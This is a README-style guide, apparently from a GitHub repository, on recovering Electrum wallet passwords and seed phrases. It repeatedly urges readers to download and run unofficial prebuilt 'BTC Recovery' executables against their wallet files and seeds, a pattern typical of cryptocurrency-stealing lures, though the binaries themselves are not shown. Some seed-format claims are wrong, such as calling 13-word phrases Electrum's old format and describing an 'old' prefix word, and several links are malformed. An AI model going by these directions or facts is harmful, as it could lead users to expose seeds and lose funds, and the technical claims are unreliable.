<div align="center">
<img src="assets/banner-article.png" alt="Electrum wallet password and seed recovery">
</div>

# Electrum wallet password and seed recovery

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

Electrum keeps two separate things to get wrong: a wallet file encrypted with a password, and a seed phrase in one of several formats. Which one you have decides the recovery  -  the file needs password candidates, the phrase needs a wallet version and a search over words.

## You'll see this if

The app is installed or the file survived, and something about it will not open. Electrum's own messages are unusually specific, and they point at different problems.

| What you see | What it points to | Where to go |
|---|---|---|
| "Invalid password" when opening the wallet | the file is fine, the password is wrong | here |
| "Unsupported seed version" on restore | an old seed version the app no longer reads directly | here |
| The phrase is rejected as not a valid seed | the words or the format are wrong | [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) |
| The wallet opens but shows no history | wrong seed version, or a different wallet altogether | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |
| The seed has 13 words | the older Electrum format, not a standard phrase | here |
| There is no `wallet.dat` anywhere | expected  -  Electrum does not use one | [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md) |

## Why it happens

Electrum encrypts its wallet file with the password you set, and the file sits in a directory of its own  -  a `.wallet` file or a `default_wallet` entry, never a `wallet.dat`. Nothing in that file records the password, so a forgotten password is a search over candidates against a copy of the file.

Seeds are the second, more confusing half. Electrum used its own 13-word seed in early versions, moved to standard 12-word phrases later, and can still restore the old ones  -  but a current app may refuse an ancient seed until the right wallet version or restore option is chosen. That refusal is not a broken phrase; it is the app telling you which era the wallet belongs to.

The two halves interact badly when people assume the password protects the coins. It does not: the seed regenerates the wallet regardless of the file password. So the fastest route for a lost password is often to restore from the seed into a new wallet, and the fastest route for a lost seed is to open the existing file, if the password is known.

## Fix

Decide which half is missing, then take the matching route  -  and restore from the seed first when both are available, because it is minutes rather than hours.

1. **Back up the wallet directory** before touching anything. The `.wallet` file, its `.wallet.bak`, and any `default_wallet` entry are all candidates, and a copy protects you from a bad run.
2. **If you have the seed and the password is lost**, restore the seed into a fresh Electrum wallet. The old file becomes irrelevant, and nothing needs to be searched.
3. **If the seed is the problem and the password is known**, open the wallet and read the seed from its own menu. That is the only copy that matters.
4. **If the password is lost and the seed is incomplete**, search the password against a copy of the file  -  a shorter job than completing a phrase: [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md).
5. **If the seed is old and the app refuses it**, choose the older seed type explicitly during restore, or use an Electrum version that still supports it. Note the word count and any prefix words the app asks about.
6. **Download the current release from the GitHub releases page** when you need the tool rather than the app, and run it offline against the file or the phrase: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
7. **Confirm with an address, not a balance.** Compare the first receiving address against a record before moving anything.

A detail worth knowing: Electrum's older 13-word seeds occasionally came with a prefix word  -  a short label such as "old" that forms part of the seed. If the words are right and the restore still fails, that prefix is usually what is missing.

## If that did not work

If neither the seed nor the password route works, the file version and the seed version are the remaining variables, and both are identifiable from the artifacts themselves.

Check the wallet file's date and the app version that wrote it. A wallet from a decade ago may need an older release to open, and its seed may need an older restore option. If the words are 12 but the app expects 13, or the phrase contains a word that is not in the standard list, the format is the issue rather than the words: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) covers partial phrases, and [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md) sets out the inputs to check in order.

One case is terminal: a file that has been overwritten or truncated. Electrum writes its wallet on exit, so a crash during a save can leave a file that no password opens. The `.wallet.bak` beside it is then the artifact to work from.

## Prevention

- Save the seed at creation and confirm a restore before funding the wallet.
- Keep the wallet directory backed up, including the `.bak` file.
- Record the seed type and the app version beside the backup.
- Use a password you store in a manager, not one you reconstruct from memory.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Does Electrum use a wallet.dat file?

No. Electrum stores a `.wallet` file, or a `default_wallet` entry, in its own data directory. Looking for a `wallet.dat` in an Electrum installation is a common dead end and a sign that the wallet type and the file type have been mixed up.

### How do I recover an Electrum wallet password?

Run a candidate search against a copy of the `.wallet` file, using what you remember about length, words and numbers. If the seed is available, restoring it is faster and makes the password irrelevant: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).

### What does "unsupported seed version" mean?

The app recognises the seed as one of its older formats but will not restore it without the matching option or version. It is a version message, not a verdict on the words, and the fix is choosing the right seed type rather than changing the phrase.

### Can I restore a 13-word Electrum seed in a current wallet?

Usually yes, if the correct older seed type is selected during restore, and sometimes with a prefix word the wallet asks for. A 13-word phrase that fails in the standard 12-word field has not been lost; it has been entered in the wrong format.

### I have 12 of the 13 words. Is that recoverable?

It is a search over one position, which is a small space, but only if the seed type and the prefix are right first. Identify the format before running anything, or the search will be correct and the target wrong.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [Invalid recovery phrase]([Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md))
- [You forgot which wallet software you used]([You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md))
- [A recovery run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md))
